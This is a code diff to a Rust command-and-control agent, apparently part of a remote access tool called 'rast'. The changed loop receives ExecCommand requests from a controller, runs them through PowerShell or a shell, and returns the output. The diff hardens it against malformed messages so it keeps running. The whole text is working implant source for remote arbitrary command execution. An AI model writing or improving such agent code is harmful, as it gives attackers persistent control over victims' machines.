@@ -16,7 +16,7 @@ use rast::{
 };
 use tokio::{process::Command as SystemCommand, sync::Mutex};
 use tokio_util::codec::BytesCodec;
-use tracing::info;
+use tracing::{debug, info};
 
 use crate::context::Context;
 
@@ -55,10 +55,28 @@ impl RastAgent {
         let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());
 
         loop {
-            if let Some(msg) = frame.next().await {
-                let msg: AgentMessage = serde_json::from_slice(&msg.unwrap()).unwrap();
-                info!("Request {:?}", msg);
-                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {todo!()};
+            if let Some(bytes) = frame.next().await {
+                let bytes = match bytes {
+                    Ok(bytes) => bytes,
+                    Err(e) => {
+                        debug!("Failed to parse bytes: {:?}", e);
+                        continue;
+                    },
+                };
+                let msg: AgentMessage = match serde_json::from_slice(&bytes) {
+                    Ok(msg) => {
+                        info!("Request {:?}", msg);
+                        msg
+                    },
+                    Err(e) => {
+                        debug!("Failed to deserialized to message: {:?}", e);
+                        continue;
+                    },
+                };
+                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
+                    debug!("Got unsupported request: {:?}", msg);
+                    continue;
+                };
 
                 let output = if cfg!(target_os = "windows") {
                     SystemCommand::new("powershell.exe")
@@ -72,13 +90,25 @@ impl RastAgent {
 
                 info!("Response {:?}", output);
                 let response = match output {
-                    Ok(output) => String::from_utf8(output.stdout)?,
+                    Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                     Err(e) => e.to_string(),
                 };
                 let response =
                     AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
-                let response = serde_json::to_vec(&response).unwrap();
-                let _result = frame.send(Bytes::from(response)).await;
+                let response = match serde_json::to_vec(&response) {
+                    Ok(serialized) => serialized,
+                    Err(e) => {
+                        info!(
+                            "Failed to serialize response, not sending response: {:?}",
+                            e
+                        );
+                        continue;
+                    },
+                };
+
+                if let Err(e) = frame.send(Bytes::from(response)).await {
+                    debug!("Failed to send response: {:?}", e);
+                };
             }
         }
     }
